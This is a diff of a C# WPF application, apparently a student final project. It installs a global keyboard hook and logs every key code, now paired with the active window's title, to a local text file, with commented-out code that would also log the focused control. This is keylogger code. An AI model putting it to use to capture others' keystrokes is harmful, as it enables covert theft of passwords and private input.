@@ -17,7 +17,7 @@ namespace AbschlussprojektWPF
     public partial class App : Application
     {
         public Logger LogFile { get; set; }
-
+  
         public static bool IsLoggingStarted { get; set; }
 
         protected override void OnStartup(StartupEventArgs e)
@@ -27,10 +27,11 @@ namespace AbschlussprojektWPF
                 KeystrokeAPI ki = new KeystrokeAPI();
                 api.CreateKeyboardHook((character) =>
                 {
+ 
                     if (IsLoggingStarted)
                     {
                         ////////////////////// Logik für Filter kommt hierhin //////////////////////////////
-                        File.AppendAllText(@"D:\KeysOnly.txt", character.KeyCode + "\r\n\r\n");
+                        File.AppendAllText(@"D:\KeysOnly.txt", character.KeyCode + " " + LogFile.GetTitleOfActiveWindow() +  "\r\n\r\n");
 
                     }
                 });
@@ -39,7 +40,7 @@ namespace AbschlussprojektWPF
                 //    if (IsLoggingStarted)
                 //    {
                 //        File.AppendAllText(@"D:\KeyLog.txt",
-                //            character + " " + LogFile.GetTitleOfActiveWindow() + " " + LogFile.GetFocusedControl() +
+                //            character.KeyCode + " " + LogFile.GetTitleOfActiveWindow() + " " + LogFile.GetFocusedControl() +
                 //            "\r\n\r\n");
                 //    }
                 //});
